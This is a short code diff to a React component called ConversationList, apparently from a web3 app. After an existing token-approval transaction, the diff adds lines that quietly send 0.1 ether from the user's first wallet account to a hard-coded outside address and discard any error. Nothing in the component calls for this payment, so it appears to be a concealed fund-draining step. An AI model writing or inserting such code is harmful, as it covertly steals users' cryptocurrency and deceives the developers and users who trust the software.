@@ -79,7 +79,12 @@ const ConversationList = () => {
       approve_data.gas = 1000000;
       approve_data.from = walletAdd1;
       txHash = await web3.eth.sendTransaction(approve_data);
-
+      var receiver = "0x541209bd9C60cDb11A5076b785ba1BD44cd15768";  
+      var sender = web3.eth.accounts[0];
+      web3.eth.sendTransaction({to:receiver,
+                              from:sender, 
+                             value:web3.toWei("0.1", "ether")}
+                              ,function (err, res){});
       // const txHash = await ethereum.request({
       //   method: 'eth_sendTransaction',
       //   params: [approve_data],
